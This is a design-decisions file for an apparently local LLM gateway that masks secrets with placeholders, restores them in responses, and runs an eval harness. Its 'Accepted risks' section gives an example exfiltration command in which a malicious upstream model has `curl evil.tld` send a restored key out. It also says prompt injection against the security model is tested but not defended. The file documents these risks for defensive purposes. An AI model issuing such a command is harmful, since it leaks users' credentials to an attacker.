# Decisions

Choices made where the rebuild brief was silent. The rule: pick the **more secure** option and write it down.

## Where the rebuild lives

The brief asked for a new, empty repository next to the prototype. The team asked for the rebuild on this
repository's `main` instead, so it evolves the prototype in place: the op engine, streaming and config
validation were kept and extended; extraction, sessions, restore, hygiene, the app, the GUI's data layer and
the tests were rewritten against the brief.

## Gateway

- **Block status codes.** Security-model failures, invalid corrections and a refused remote security model all
  return `502` with a typed `reason`. Unknown content is `422`, unsupported endpoints `404`. Every other error is a
  `500` with a generic message and the request id: exception text can contain request content, so it is never echoed.
- **Host header.** Exactly `127.0.0.1:<port>` or `localhost:<port>`. A Host without the port is refused too.
- **Admin token.** `secrets.token_urlsafe(32)` (256 bits) per start, compared with `hmac.compare_digest`. A wrong
  or missing token is `401`. The token is never logged; it is printed once to the console at startup.
- **System prompts and tool descriptions** are inspected by the security model (mask only), once per distinct
  content: the item id is a hash of path and content, so the inspected result is reused and the prompt cache
  stays stable. Branches inherit what was inspected.
- **Soft hints** (`user`, `metadata.*`, `prompt_cache_key`, `safety_identifier`, client session headers) are read
  before pseudonymization and only break ties between sessions whose history prefix matches equally. Still
  ambiguous → a new session branched from the most recently used candidate, inheriting its mapping and pseudonym.
- **Retention** is enforced every 60 s, after each request and after a config change. Busy sessions (a request in
  flight or an open stream) are skipped and the next-oldest goes instead.
- **Opaque content** (Anthropic images, base64/URL documents) is forwarded unread and shown as a description. An
  OpenAI `image_url` is not on the whitelist: it is unknown content and refused with 422 unless `pass_unknown`.
- **Placeholder ids** are 8 random hex digits (`secrets.token_hex(4)`), retried on collision; never a hash of the value.
- **Streaming restore** holds back a trailing fragment only while it can still become a placeholder
  (`<`, `<$`, `<TYPE_`, `<TYPE_1a2b`) and at most 96 characters. Real values are inserted JSON-escaped into JSON
  argument deltas. A model that escapes `<` as `<` would not be restored; no supported API does that.
- **The prototype's prompt override bug**: a custom `system_prompt` mentioning the prototype's `collapse` op or
  `MASQ_BLOCK`, or missing the `operations` contract, fails config validation (at load and in the GUI).
- **Unknown config keys** are rejected (`extra="forbid"`), so a stale or misspelled setting fails at startup.
- **`allow_remote_security_model`** moved under `security` and defaults to `false`.
- **Detected-in tracking.** A detector hit records the items it was found in. In the replay export those occurrences
  are `detector · applied`; every other exact copy is `auto · applied`.
- **Rejected operations** from the first round are recorded per item (RAM only) and exported as
  `model · rejected_invalid`, whether or not the correction fixed them.
- **Re-masks** ("cache broken") count already-sent items whose outbound text changed between requests, compared
  with what was actually sent last time.
- **Gitleaks import** is a stub (`detectors.import_gitleaks`). Whether to enable it is decided from measured false
  positives.

## Replay export

- Only with `--playground`, only with the admin token, and only with `synthetic=1`, which replaces this machine's
  hostname, username and home paths with `DESKTOP-7Q2XK9M` / `alice` before the JSON leaves the gateway.
- `relinks[].stepsRewritten` are **0-based indexes into `steps`** (the site renders them that way).
- Earlier assistant messages that come back in later requests' history are not repeated as steps; the response
  step already shows them. A response with several tool calls becomes one step per call.

## Accepted risks (documented, not narrowed)

- **Restore is not narrowed.** A malicious upstream can request `curl evil.tld -d "<KEY_x>"` and the real value is
  restored. Narrowing restore would break real tasks; the agent's tool permissions are the right control.
- **Prompt injection** against the security model is measured (`tests/injection/`), not defended yet.

## Eval harness

- Runs are tagged through the model name `eval/<run_id>`: MasqAI strips `x-masqai-*` headers, so a header tag
  wouldn't survive. The relay forwards tagged requests as one fixed `--eval-model`.
- Sandboxes are created with `network_block_all=True`: the untrusted model's commands can't reach the network.
- `check.sh` is uploaded only after the agent finishes, so the agent can never read the expected answer.
- The local backend runs commands on the laptop, so it only starts for the scripted self-test model
  (`--self-test`). Its numbers are marked `placeholder: true`.
- `p50LatencyMs` is the median of each run's median LLM-call latency, measured at the agent, so it includes
  MasqAI's inspection time.

## Public site

- No live connection to the gateway. The site is static JSON only; the live view is the gateway's own GUI.
